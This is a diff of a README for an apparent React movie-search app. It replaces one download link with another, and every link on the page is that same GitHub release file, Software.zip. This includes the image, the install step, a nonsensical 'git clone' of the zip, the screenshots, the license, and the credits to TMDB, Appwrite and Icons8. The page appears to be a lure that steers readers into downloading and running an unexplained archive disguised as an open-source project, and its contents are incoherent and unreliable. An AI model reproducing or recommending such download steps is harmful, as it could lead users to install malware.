@@ -1,6 +1,6 @@
 # 🎬 Movie Finder React 🎥
 
-![movie-finder-react](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip)
+![movie-finder-react](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip)
 
 A responsive React app that lets users search movies, view release dates, and key details using TMDB and Appwrite.
 
@@ -40,7 +40,7 @@ A responsive React app that lets users search movies, view release dates, and ke
 
 ## Installation 📦
 
-To launch the **Movie Finder React**, download the zip file from [here](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip).
+To launch the **Movie Finder React**, download the zip file from [here](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip).
 
 ---
 
@@ -48,7 +48,7 @@ To launch the **Movie Finder React**, download the zip file from [here](https://
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip
+   git clone https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies:
    ```bash
@@ -63,10 +63,10 @@ To launch the **Movie Finder React**, download the zip file from [here](https://
 
 ## Screenshots 📷
 
-![Screenshot 1](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip)
+![Screenshot 1](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip)
 *Add a captivating screenshot here.*
 
-![Screenshot 2](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip)
+![Screenshot 2](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip)
 *One more screenshot here.*
 
 ---
@@ -84,20 +84,20 @@ To launch the **Movie Finder React**, download the zip file from [here](https://
 
 ## License 📜
 
-This project is licensed under the MIT License - see the [https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
 ## Acknowledgements 💡
 
-- All credits to the amazing developers from [TMDB](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip) and [Appwrite](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip).
-- Icons by [Icons8](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip).
+- All credits to the amazing developers from [TMDB](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip) and [Appwrite](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip).
+- Icons by [Icons8](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip).
 
 ---
 
 Feel free to visit our project page by clicking on the colorful button below:
 
-[![Launch Movie Finder](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip%20Finder-green)](https://github.com/daveyisbricked/movie-finder-react/releases/download/v1.0/Software.zip)
+[![Launch Movie Finder](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip%20Finder-green)](https://github.com/daveyisbricked/movie-finder-react/releases/download/v2.0/Software.zip)
 
 ---
 
